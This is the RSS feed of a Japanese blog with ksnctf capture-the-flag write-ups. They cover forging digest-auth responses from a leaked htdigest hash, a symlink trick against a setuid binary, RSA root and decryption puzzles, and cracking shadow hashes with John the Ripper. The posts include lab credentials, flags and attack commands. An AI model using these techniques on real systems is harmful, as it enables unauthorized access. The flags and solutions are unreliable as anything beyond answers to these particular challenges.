<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Ctf on vintersnow&#39;s page</title>
    <link>http://vintersnow.github.io/tags/ctf/index.xml</link>
    <description>Recent content in Ctf on vintersnow&#39;s page</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>ja-JP</language>
    <atom:link href="http://vintersnow.github.io/tags/ctf/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>ksnctf: #9 digest is secure!</title>
      <link>http://vintersnow.github.io/ctf/ksnctf_digest_is_secure/</link>
      <pubDate>Fri, 30 Dec 2016 23:35:12 +0900</pubDate>
      
      <guid>http://vintersnow.github.io/ctf/ksnctf_digest_is_secure/</guid>
      <description>

&lt;h1 id=&#34;問題&#34;&gt;問題&lt;/h1&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;http://ksnctf.sweetduet.info/q/9/q9.pcap&#34;&gt;http://ksnctf.sweetduet.info/q/9/q9.pcap&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&#34;解法&#34;&gt;解法&lt;/h1&gt;

&lt;p&gt;問題文から分かるようにdigest認証の問題。
basic認証がガバガバだったのと違い、digest認証はもう少し安全。&lt;/p&gt;

&lt;p&gt;wikipedia曰く以下のように認証する。&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;A1 = ユーザ名 &amp;ldquo;:&amp;rdquo; realm &amp;ldquo;:&amp;rdquo; パスワード&lt;br /&gt;
A2 = HTTPのメソッド &amp;ldquo;:&amp;rdquo; コンテンツのURI&lt;br /&gt;
response = MD5( MD5(A1) &amp;ldquo;:&amp;rdquo; nonce &amp;ldquo;:&amp;rdquo; nc &amp;ldquo;:&amp;rdquo; cnonce &amp;ldquo;:&amp;rdquo; qop &amp;ldquo;:&amp;rdquo; MD5(A2) )&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;ユーザーはサーバーからnonce、nc、conce、qopが与えられてresponseを作る。
サーバーはA1を持っているので、responseを作って照合する。&lt;/p&gt;

&lt;p&gt;なるほど確かに逆ハッシュが出来ないと厳しそう。&lt;/p&gt;

&lt;p&gt;hydraというツールがあるくらいなので出来ないことは無いのだろうが…&lt;br /&gt;
と思ってpcapファイルを眺めていると、なんとhtdigestを覗いているではないか！&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;GET /~q9/htdigest HTTP/1.1
Host: ctfq.sweetduet.info:10080
Connection: keep-alive
Authorization: Digest username=&amp;quot;q9&amp;quot;, realm=&amp;quot;secret&amp;quot;, nonce=&amp;quot;bbKtsfbABAA=5dad3cce7a7dd2c3335c9b400a19d6ad02df299b&amp;quot;, uri=&amp;quot;/~q9/htdigest&amp;quot;, algorithm=MD5, response=&amp;quot;d9f18946e5587401c303b34e00a059eb&amp;quot;, qop=auth, nc=00000002, cnonce=&amp;quot;6945eb2a7ba8cf7f&amp;quot;
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.162 Safari/535.19
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,sdch
Accept-Language: ja,en-US;q=0.8,en;q=0.6
Accept-Charset: Shift_JIS,utf-8;q=0.7,*;q=0.3

HTTP/1.1 200 OK
Date: Sat, 26 May 2012 20:54:53 GMT
Server: Apache/2.2.15 (CentOS)
Authentication-Info: rspauth=&amp;quot;022023eac9b9e023d50cca5eef69c287&amp;quot;, cnonce=&amp;quot;6945eb2a7ba8cf7f&amp;quot;, nc=00000002, qop=auth
Last-Modified: Sat, 26 May 2012 12:30:54 GMT
ETag: &amp;quot;422e4-2b-4c0efa7f441cf&amp;quot;
Accept-Ranges: bytes
Content-Length: 43
Connection: close
Content-Type: text/plain; charset=UTF-8

q9:secret:c627e19450db746b739f41b64097d449
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;つまり&lt;code&gt;A1&lt;/code&gt;がc627e19450db746b739f41b64097d449と分かった。&lt;/p&gt;

&lt;p&gt;ここでdigest認証のレスポンスの作り方をもう一度見ると、&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;response = MD5( MD5(A1) &amp;ldquo;:&amp;rdquo; nonce &amp;ldquo;:&amp;rdquo; nc &amp;ldquo;:&amp;rdquo; cnonce &amp;ldquo;:&amp;rdquo; qop &amp;ldquo;:&amp;rdquo; MD5(A2) )&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
&lt;li&gt;A1 ← 分かった&lt;/li&gt;
&lt;li&gt;A2 ← 分かる&lt;/li&gt;
&lt;li&gt;nonce,nc,cnonce,qop ← 相手から与えられる&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;というわけでレスポンスが作れる！
（&lt;a href=&#34;http://ksnctf.sweetduet.info:10080/~q9&#34;&gt;http://ksnctf.sweetduet.info:10080/~q9&lt;/a&gt; がアクセス可能だと気づくのにしばらく時間がかかったが&amp;hellip;）&lt;/p&gt;

&lt;p&gt;responseの書き換えにはburpSuiteを使用する。これはproxyを立てることでhttp通信を覗き見、書き換えすることが出来るツールだ。
セットアップの仕方は&lt;a href=&#34;http://tech.pjin.jp/blog/2016/07/15/burp-suite-1-7%E3%81%AE%E4%BD%BF%E3%81%84%E6%96%B9%E3%80%80%E3%81%9D%E3%81%AE%EF%BC%92/&#34;&gt;ここらへん&lt;/a&gt;参考に。&lt;/p&gt;

&lt;figure&gt;
  &lt;img src=&#34;http://vintersnow.github.io/static/images/geek/test.jpg&#34; alt=&#34;ksnctf: #9 digest is secure! static/images/geek/test.jpg&#34;&gt;
  
&lt;/figure&gt;


&lt;p&gt;nonceなどをコピーしてレスポンスを生成して書き換えるとflagが手に入った。&lt;/p&gt;

&lt;script src=&#34;https://gist.github.com/vintersnow/23f1c45a295eb990bccc6ec21a19d1c8.js&#34;&gt;&lt;/script&gt;

&lt;h2 id=&#34;おまけ-htdigest&#34;&gt;おまけ htdigest&lt;/h2&gt;

&lt;p&gt;やったことがなかったので、htdigestを試してみる。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;❯ htdigest -c htdigest_test secret vinter
Adding password for vinter in realm secret.
New password: # vinterと入力
Re-type new password:

~/Projects/CodeSite/CTF/ksnctf/09_digest_is_secure
❯ cat htdigest_test
vinter:secret:98ef267645a2168773d7b944345ecf47

~/Projects/CodeSite/CTF/ksnctf/09_digest_is_secure
❯ md5 -s vinter:secret:vinter
MD5 (&amp;quot;vinter:secret:vinter&amp;quot;) = 98ef267645a2168773d7b944345ecf47
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;確かにhashが一致している。&lt;/p&gt;

&lt;h1 id=&#34;point&#34;&gt;point&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;1031&lt;/strong&gt;&lt;/p&gt;

&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://ja.wikipedia.org/wiki/Digest%E8%AA%8D%E8%A8%BC&#34;&gt;https://ja.wikipedia.org/wiki/Digest%E8%AA%8D%E8%A8%BC&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://tech.pjin.jp/blog/2016/07/15/burp-suite-1-7%E3%81%AE%E4%BD%BF%E3%81%84%E6%96%B9%E3%80%80%E3%81%9D%E3%81%AE%EF%BC%92/&#34;&gt;http://tech.pjin.jp/blog/2016/07/15/burp-suite-1-7%E3%81%AE%E4%BD%BF%E3%81%84%E6%96%B9%E3%80%80%E3%81%9D%E3%81%AE%EF%BC%92/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>ksnctf: #17 math2</title>
      <link>http://vintersnow.github.io/ctf/ksnctf_math2/</link>
      <pubDate>Thu, 29 Dec 2016 20:56:45 +0900</pubDate>
      
      <guid>http://vintersnow.github.io/ctf/ksnctf_math2/</guid>
      <description>

&lt;h1 id=&#34;問題&#34;&gt;問題&lt;/h1&gt;

&lt;blockquote&gt;
&lt;p&gt;How important is modulo arithmetic in cryptography?&lt;/p&gt;

&lt;p&gt;Let
  x = 2748040023408750324411119450523386950660946398855386842074606380418316981389557916980086140301887947706700698930830779678048474531538039134089675000612962004189001422715316147779554460684462041893073445562829316520071658956471592707597247194589999870235577599858641217209525243986680999448565468816434633441308131788183291153809253610695081752296732033298647222814340913466738465892791206393936089466068684809286651197884210187525269355913763182559833600649423167126622527203197940618965341674710993871930168655984019611567024681974446413864111651893113475795042753452042221938667445789706741508160949598322950403760355305740757495122850819958219745478009476321531997688864567881328571570240278649150057863614800304034452842380274161491817926949213762740941829027657311016236224840157689532838274458699038989430527152474540367086746579688987076042252804910459873636444778218434530247647760637770881658596016745610672707638583665201858035977485748775481448417394363801163664632527695106599930657132405666766730530997168969743603771751166591137309462845077320233889570871715682231576283485837079838925927845291565664213349164253238166525895494203520538861102027123057706413048503799598270037162337386882901940037500301040636118696723417952777083334146545991127148023661461455142653367976629308434919237639329808504561590505864983890552051987234096577849288536293631380950881787840319976968198704697701966146561843819563765280293823120028941691560894722032503932540560461794190408016359786029679686957711035845785762377768203676919060935155382104877926736292611130243057909501332528103700463961697932230444978571571548190911155741113324573679444638703192583211952316173122745153529542339170631749363019742630339456502772150867703497326010832217054307087826776870481852284816747574983354077170761286175754243223519482572371717625453405597596790583499145036350302955327521461648262537855645876387858201576107385450844609238327605056916243564458120595540013872075267316304999752934829122583429168665162743589578036716137649553856654996867605565582594039606555708509284616434305172100068285925706963351193710675088846623856567419346569873886366829228933416064828304824833588800700991940600359503453201939139663042787644390810036292415117714919711827630953170559057272633043896443339064006637234499569232762828723613158050896065355005775876910820958296537497557737916521798848004761708690607167573807307291510879396794861418856342383200817566360552405183866698509354047737422523253071467100174078467454351746681775690022510266842064132386305358891086764558955802257688899610117102582837343655907837234028334304769930810792079059216436489942124896722072971246781926084943216581585837400274934104255861076781834022322597318553478829221018993823759479304536464719195824731739557957722610850860725276329731096193041588880149698625007746958307472328762247329346952956782896672291984502790479223886842985800649168009891087704339671376795754679245964575179873102014722210341771266309855717402003098724600141420936602986387680283404929020457247001371544838792904086327642729822000980710278752669990211765608002907900832262843253793831541691706704836397397798869236939393204666502455311086553874765248631328418556164635889080357612074921368044611251307530838475840480894307375072202500636365832958938363048173011687247738236161480446422712858040552310006617829659443118541556912488329721272939472554467384944920030182974546889304443711910957344160175437149714520561879951921970795705645045936350875827028675689840953101114431720413756855193291198455863087675930604549263160397353363504597829924339064422377323361781720524799661393081986371074530022532621955945720583925291264598924971169093688390536693144593482790588893095052569365154072722966434676949346037949263628957665599420417719951187489606010866702371368012263032537375401145460592536898818245350468847674995676417425737655723761467908866712060720593684978725896677308273.&lt;/p&gt;

&lt;p&gt;Find the value of y such that y101 = x.
The flag is FLAG_y (in decimal notation).&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&#34;解法&#34;&gt;解法&lt;/h1&gt;

&lt;p&gt;求めるものは自明なので、問題はどうやって解くか。&lt;/p&gt;

&lt;p&gt;自分でべき乗を計算する処理を書いても良いのだが、今後同じようなことをしたい時簡単に解けるように楽な方法を探すことにした。&lt;/p&gt;

&lt;p&gt;MPFRを使えるgmpy2というライブラリが良さそう。他にsageなどもある。&lt;/p&gt;

&lt;script src=&#34;https://gist.github.com/vintersnow/48eece5d7813dc8299d77ea7c88a5024.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;自分で書くなら2分木探索をしたらいい。&lt;/p&gt;

&lt;script src=&#34;https://gist.github.com/vintersnow/acef02b3de272fbdb22f6339868cdd0b.js&#34;&gt;&lt;/script&gt;

&lt;h1 id=&#34;point&#34;&gt;point&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;881&lt;/strong&gt;&lt;/p&gt;

&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://stackoverflow.com/questions/39794338/precise-nth-root&#34;&gt;http://stackoverflow.com/questions/39794338/precise-nth-root&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>ksnctf_math1</title>
      <link>http://vintersnow.github.io/ctf/ksnctf_math1/</link>
      <pubDate>Thu, 29 Dec 2016 20:35:21 +0900</pubDate>
      
      <guid>http://vintersnow.github.io/ctf/ksnctf_math1/</guid>
      <description>

&lt;h1 id=&#34;問題&#34;&gt;問題&lt;/h1&gt;

&lt;blockquote&gt;
&lt;p&gt;Let
  e = 65537,&lt;br /&gt;
  n = 1517330236262917595314610888889322115651087080826711948897066340883208205571592392362650858571076247939805436226544833224526137582834770402681005343930059463684528957271778199162575053306238099823295117697031968370690372250916935800738698142103275969223264184374648246277564306900886005299731265812255274723175925185522344831066577166867786835955092059346244885587228196357297758371381557924676260190209536670230008561217008649261974735505203813478978893582292682827884118215872470401293272325715864815977064075988643101088355047954735427424641386870772845440782632933485165110172437511822736907550777817722248753671107339823410418938404382732079381329288400012929311347390423061254658780185245562668131009832293474920208834795460061115101364091252176594144096675899952570380792978037217747311595899301451192342027799533264325948876556110474850761538179748318187805312451895898751337975457949549497666542175077894987697085521882531938339334715190663665300179658557458036053188152532948734992896239950564081581184284728802682982779186068791931259198917308153082917381616147108543673346682338045309449569430550618884202465809290850964525390539782080230737593560891353558335337408957948041667929154230334506735825418239563481028126435029,
  c = me mod n = 225549592628492616152632265482125315868911125659971085929712296366214355608049224179339757637982541542745010822022226409126123627804953064072055667012172681551500780763483172914389813057444669314726404135978565446282309019729994976815925850916487257699707478206132474710963752590399332920672607440793116387051071191919835316845827838287954541558777355864714782464299278036910958484272003656702623646042688124964364376687297742060363382322519436200343894901785951095760714894439233966409337996138592489997024933882003852590408577812535049335652212448474376457015077047529818315877549614859586475504070051201054704954654093482056493092930700787890579346065916834434739980791402216175555075896066616519150164831990626727591876115821219941268309678240872298029611746575376322733311657394502859852213595389607239431585120943268774679785316133478171225719729917877009624611286702010936951705160870997184123775488592130586606070277173392647225589257616518666852404878425355285270687131724258281902727717116041282358028398978152480549468694659695121115046850718180640407034795656480263573773381753855724693739080045739160297875306923958599742379878734638341856117533253251168244471273520476474579680250862738227337561115160603373096699944163.
You have succeeded in factorization of n using Shor&amp;rsquo;s algorithm as follows:&lt;br /&gt;
  n = pq,&lt;br /&gt;
  p = 34111525225922333955113751419357677129436029651245533697825114748126342624744832960936498161825269430327019858323450578875242014583535842110912370431931233957939950911741013017595977471949767235426490850284286661592357779825212265055931705799916913817655743434497422993498931394618832741336247426815710164342599150990608143637331068220244525541794855651643135012846039439355101027994945120698530177329829213208761057392236875366458197098507252851244132455996468628957560178868724310000317011912994632328371761486669358065577269198065792981537378448324923622959249447066754504943097391628716371245206444816309511381323,
  q = 44481453884385518268018625442920628989497457642625668259648790876723318635861137128631112417617317160816537010595885992856520476731882382742220627466006460645416066646852266992087386855491152795237153901319521506429873434336969666536995399866125781057768075533560120399184566956433129854995464893265403724034960689938351450709950699740508459206785093693277541785285699733873530541918483842122691276322286810422297015782658645129421043160749040846216892671031156465364652681036828461619272427318758098538927727392459501761203842363017121432657534770898181975532066012149902177196510416802134121754859407938165610800223.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&#34;解法&#34;&gt;解法&lt;/h1&gt;

&lt;p&gt;RSA暗号のNが量子コンピュータで素因数分解出来たという設定。&lt;/p&gt;

&lt;p&gt;素因数分解が出来たら後は簡単。&lt;/p&gt;

&lt;p&gt;d = e^-1 (mod (p-1)*(q-1))&lt;br /&gt;
m = c^d (mod n)&lt;/p&gt;

&lt;p&gt;である。&lt;/p&gt;

&lt;script src=&#34;https://gist.github.com/vintersnow/6dd6a38984554365149c1ffa962ea8a1.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;modのインバースや巨大数のべき乗の計算はうまいことしないと計算量が増大するのでライブラリを使うようにした。&lt;br /&gt;
pycryptoのnumberは便利なんだけど少し物足りない。numpyやsympyを使ったほうがいいのかな？&lt;/p&gt;

&lt;h1 id=&#34;point&#34;&gt;point&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;831&lt;/strong&gt;&lt;/p&gt;

&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://ja.wikipedia.org/wiki/RSA%E6%9A%97%E5%8F%B7&#34;&gt;https://ja.wikipedia.org/wiki/RSA%E6%9A%97%E5%8F%B7&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>ksnctf: #13 proverb</title>
      <link>http://vintersnow.github.io/ctf/ksnctf_proverb/</link>
      <pubDate>Thu, 29 Dec 2016 19:42:07 +0900</pubDate>
      
      <guid>http://vintersnow.github.io/ctf/ksnctf_proverb/</guid>
      <description>

&lt;h1 id=&#34;問題&#34;&gt;問題&lt;/h1&gt;

&lt;blockquote&gt;
&lt;p&gt;SSH: ctfq.sweetduet.info:10022
ID: q13
Pass: 8zvWx00MakSCQuGq&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&#34;解法&#34;&gt;解法&lt;/h1&gt;

&lt;p&gt;sshで接続すると以下のようなファイルがあるホームディレクトリに接続する。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[q13@localhost ~]$ ll
total 28
-r-------- 1 q13a q13a    22 Jun  1  2012 flag.txt
---s--x--x 1 q13a q13a 14439 Jun  1  2012 proverb
-r--r--r-- 1 root root   755 Jun  1  2012 proverb.txt
-r--r--r-- 1 root root   151 Jun  1  2012 readme.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;見ての通りflag.txtはq13aユーザーでしか見れない。
proverbは実行可能で実行するとことわざを出力してくれる。
でこのことわざはproverb.txtにかかれているものと同じみたい。&lt;/p&gt;

&lt;p&gt;readme.txtは、&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[q13@localhost ~]$ cat readme.txt
You are not allowed to connect internet and write the home directory.
If you need temporary directory, use /tmp.
Sometimes this machine will be reset.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;なにかするならtmpでやれとのこと。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[q13@localhost ~]$ cd /tmp
[q13@localhost tmp]$ ls
ls: cannot open directory .: Permission denied
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;とりあえずディレクトリ作ってみる。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[q13@localhost tmp]$ mkdir q13
mkdir: cannot create directory `q13&#39;: File exists
[q13@localhost tmp]$ cd q13
[q13@localhost q13]$ ls
proverb  proverb.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;んんん？&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[q13@localhost q13]$ ./proverb
FLAG_XoK9PzskYedj/T&amp;amp;B
[q13@localhost q13]$ ll
total 0
lrwxrwxrwx 1 q13 q13 17 Dec 21 13:08 proverb -&amp;gt; /home/q13/proverb
lrwxrwxrwx 1 q13 q13 18 Dec 21 13:10 proverb.txt -&amp;gt; /home/q13/flag.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;なるほど。proverbはproverb.txtから読み取っているのでflag.txtにシンボリックリンクを貼ればいいんだね。&lt;/p&gt;

&lt;p&gt;&amp;hellip;消していおいてよ:&amp;lt;&lt;/p&gt;

&lt;h2 id=&#34;setuid-bit&#34;&gt;setuid bit&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;---s--x--x 1 q13a q13a 14439 Jun  1  2012 proverb
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;proverbについている&lt;code&gt;s&lt;/code&gt;はsetuid bitと言ってどのユーザーが実行してもそれをowner権限で実行するというもの。
今回これがあるからothersのq13が実行したのにflag.txtを読むことが出来た。&lt;/p&gt;

&lt;p&gt;このsetuid bitはpasswdなどに使われている。&lt;/p&gt;

&lt;h1 id=&#34;point&#34;&gt;point&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;681&lt;/strong&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>ksnctf: #14 john</title>
      <link>http://vintersnow.github.io/ctf/ksnctf_john/</link>
      <pubDate>Thu, 29 Dec 2016 18:38:01 +0900</pubDate>
      
      <guid>http://vintersnow.github.io/ctf/ksnctf_john/</guid>
      <description>

&lt;h1 id=&#34;問題&#34;&gt;問題&lt;/h1&gt;

&lt;blockquote&gt;
&lt;p&gt;user00:$6$Z4xEy/1KTCW.rz$Yxkc8XkscDusGWKan621H4eaPRjHc1bkXDjyFtcTtgxzlxvuPiE1rnqdQVO1lYgNOzg72FU95RQut93JF6Deo/:15491:0:99999:7:::
user01:$6$ffl1bXDBqKUiD$PoXP69PaxTTX.cgzYS6Tlj7UBvstr6JruGctoObFXCr4cYXjIbxBSMiQZiVkKvUxXUC23zP8PUyXjq6qEq63u1:15491:0:99999:7:::
user02:$6$ZsJXadT/rv$T/2gVzYwMBaAsZnHIjnUSmTozIF/ebMvtHIJjikFehvB8pvy28DUIQYbTJLG6QAxhzJAKOROnZq0xV4hUGefM1:15491:0:99999:7:::
user03:$6$l0NHH5FF0H/U$fPv3c5Cdls/UaZmglR4Qqh8vhpIBsmY1sEjHi486ZcDQ2Vx5GY0fcQYSorWj6l42jfI47w437n.NBm8NArFyT/:15491:0:99999:7:::
user04:$6$wAnAP/NMiLa/yE$.gi4r3xYuPTg5z2S59z2EzFbqpmwZYy1tBSVA9/hqTFnWY0tHqXbwL.dFQwHzKTuzXV6WMgjEZlyzUPGzVtPb0:15491:0:99999:7:::
user05:$6$jTgFhKHk/$xQIdn7snYAAGvifxC02YLXcAKkiuPbJ3KBkH2Q8BZ12TL2aepaUJotgfKfNSPCXWebyCY/skOmOymok.KIm5D0:15491:0:99999:7:::
user06:$6$8LXZt/zPbLtIn1o$ynsZxueG88Kz0vDr3cyK.21cv4GWw9iaW9oYZcmZ9SY5UpMQS1wl2/dbXGyR8WzVBKKP/6k8VYvWuiNQ3We52/:15491:0:99999:7:::
user07:$6$jnA8m/S5aU0/$PGrG8mDy.vs3W9xhG1qd56eOEainH9xntY48.duznt989TXMn6J.scOBqp4BWg3fHWxoFgBn26LYvcnqWGcoF1:15491:0:99999:7:::
user08:$6$ITB7n/qsP$fmrmItHX9B96PmhsxIX21vdYDvFHiIPnyzRFjWIbcd3y/DRHCm0lzyJEnWlQChdDAiFUFXtqwoTbEdREXQ99M.:15491:0:99999:7:::
user09:$6$LpgLJrjPV$6sa0KW08Q10S.C/BSUHlHaQZT5n8uIygZSsWP5drdmuhI7c17wWCK/GEzQS7g8EL//5bqdjo1C90smTDhLEcF1:15491:0:99999:7:::
user10:$6$0VSPwOzcL//6QR$RgtMpkfVPb5Cli7cjVE5jMgJlN10xY1R3jxRNrY0l/84R3.NvxP3I8XtkMkonU6DKhge0JGp54DZLQqUN9kL7/:15491:0:99999:7:::
user11:$6$zryub/lvSKj7Xl$eazV2fmcJa5M3qMovQqARGK59Qxtfv2zjUJvphKNnyUMVyBn.SjEFhRT/mAjz3QFroNbwmrYLtrpyxjH.q64n/:15491:0:99999:7:::
user12:$6$tAkM0dDUFe76d8K/$OnNGFEuIf1seMlLHb.8.y5/cpmBUcMbhLhOfFdd0E/DKASXPS4riB4uz2Fg3om9Atg.g7s.JFoKV0uuJ461KV/:15491:0:99999:7:::
user13:$6$0cCdE5Nfqu/HFS$PwnLdS.chtm6qGwf2Uuiko7V3fMwjcQ52M8hslvoReFQ9XOBXw603Ok20VJwWAwR6RNv6adn6a6kuRm5Y3.ge1:15491:0:99999:7:::
user14:$6$RgPs7j4eSa/v$71CeLB9Z1Fafi6vi2ou5LzRz5xXWTzvZeZgelnm2przx.JQYp21p8h2BCyTYFd10MKD/cquPvn42vSzlJJJ8Q1:15491:0:99999:7:::
user15:$6$1uhGQ/5DwMp/$UjYTEVaChEzmUITvWpaZVvYYDLBULpI4IEyieClSsyC2NHwEnaDx6xwtUVpQPxEhi6R7OQhX68Oo5CfilYqDQ.:15491:0:99999:7:::
user16:$6$V/InSacMp8U$UpDgdL/GS/kdFmn1rO97YkLAeTgofu4fDVUGoV1PWnVFxUtVyx24ix5hJp53FkBuqdzmXgwGcb6MU5AWJWjaB1:15491:0:99999:7:::
user17:$6$d6mWSrE8vxDe$UqTgKPfKxm0/Aboz8DeFNNiZsFBYyE6iGpqUzSX4UpWSDfXt1DERBtI29H2Gz5q.6ls3730naAo31wAacvs/L0:15491:0:99999:7:::
user18:$6$ulcKu/ddomcNGRJj$i8XB1D4YtLGbAHX0XHX88ObUWw8dQsrTqoliGAU//zGHNLmLeWd.4k5YHViNSy3rlGTQSRPtutlKnub8aRnzy0:15491:0:99999:7:::
user19:$6$cVnhE9CwfSIIA$wrn6p3cgfz.JOc6KVkieNCtc.FzkjUdcDDlivn0APnYv9/z4tt7hUpPft5T8kMmnx/hiF92vjnDxcauVyQySp.:15491:0:99999:7:::
user20:$6$2Pg2VxXg$K8AqsCMPAFiXSxNjETBWqEHQom9Q5dDIz9/nItxpQatrG9gvv9CRJP3kQzKLbRf13FxfOXpeEYIpOEK.2i1HP0:15491:0:99999:7:::
user99:$6$SHA512IsStrong$DictionaryIsHere.http//ksnctf.sweetduet.info/q/14/dicti0nary_8Th64ikELWEsZFrf.txt:15491:0:99999:7:::&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&#34;解法&#34;&gt;解法&lt;/h1&gt;

&lt;p&gt;調べてみるとlinuxのユーザーパスワードだと分かる。&lt;code&gt;/etc/shadow&lt;/code&gt;で調べたら出てくる。&lt;/p&gt;

&lt;p&gt;&lt;code&gt;:&lt;/code&gt;で各フィールドが区切られていて、第一フィールドがユーザー名、第二フィールドがパスワードのハッシュである。
&lt;code&gt;$6$&lt;/code&gt;なのでハッシュ方式はsha2だ。&lt;/p&gt;

&lt;p&gt;johnという名前からjohn the ripperという有名なパスワードクラッキングツールを使うのだろう。
辞書ファイルをどうしようかと思ったが、幸いなことに最後の行にこう書かれている。&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;$6$SHA512IsStrong$DictionaryIsHere.http//ksnctf.sweetduet.info/q/14/dicti0nary_8Th64ikELWEsZFrf.txt&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;辞書をダウンロードしてきてjohn the ripperを試す。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[vagrant@kali] ~/projects/ctf/ksnctf/16
# $ /usr/sbin/john --wordlist=dicti0nary_8Th64ikELWEsZFrf.txt shadow

...

HELD             (user10)
ADDITIONAL       (user02)
QUESTION         (user16)
SPIRITS          (user06)
DELIGHT          (user20)
__________       (user04)
GENDER           (user03)
FREQUENT         (user00)
SUFFERS          (user11)
zecht            (user14)
applies          (user05)
LATTER           (user01)
LEAVE            (user12)
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;user00~04を見るに各パスワードの先頭を番号順でつなげればいい。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;cat result | sed -e &#39;s/ //g&#39; -e &#39;s/(user/ /g&#39; -e &#39;s/)//&#39; | sort -k 2 | awk &#39;{printf substr($1,0,1)}&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;おまけ&#34;&gt;おまけ&lt;/h2&gt;

&lt;p&gt;shadowのハッシュの先頭部分&lt;code&gt;$*$&lt;/code&gt;がハッシュの方式を表しているらしい。&lt;/p&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;code&gt;$*$&lt;/code&gt;&lt;/th&gt;
&lt;th&gt;方式&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;

&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;$1$&lt;/td&gt;
&lt;td&gt;md5&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;$2?$&lt;/td&gt;
&lt;td&gt;Blowfish(?はaやxだったりなかったりする)&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;$5$&lt;/td&gt;
&lt;td&gt;sha1&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;$6$&lt;/td&gt;
&lt;td&gt;sha2&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;h1 id=&#34;point&#34;&gt;point&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;611&lt;/strong&gt;&lt;/p&gt;

&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://d.hatena.ne.jp/JULY/20110317&#34;&gt;http://d.hatena.ne.jp/JULY/20110317&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>ksnctf: #25 reserved</title>
      <link>http://vintersnow.github.io/ctf/ksnctf_reserved/</link>
      <pubDate>Thu, 29 Dec 2016 15:48:37 +0900</pubDate>
      
      <guid>http://vintersnow.github.io/ctf/ksnctf_reserved/</guid>
      <description>

&lt;h1 id=&#34;問題&#34;&gt;問題&lt;/h1&gt;

&lt;blockquote&gt;
